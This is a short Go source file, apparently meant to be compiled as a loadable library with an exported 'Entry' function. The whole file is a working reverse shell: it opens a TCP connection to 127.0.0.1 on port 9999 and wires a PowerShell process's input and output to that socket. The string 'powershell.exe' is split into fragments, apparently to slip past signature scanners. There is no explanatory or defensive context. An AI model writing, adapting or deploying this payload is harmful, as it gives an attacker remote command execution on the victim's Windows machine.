package main

import (
  "C"
  "os/exec"
  "net"
)

//export Entry
func Entry(){
  main()
}

func main() {
        dst := "127.0.0.1"
        pnum := "9999" 
        connstring := dst + ":" + pnum
        prot := "tcp"
        netData, _ := net.Dial(prot, connstring)
        shell := exec.Command("pow" + "er" + "she" + "ll.e" + "xe")
        shell.Stdin=netData
        shell.Stdout=netData
        shell.Stderr=netData
        shell.Run()
}
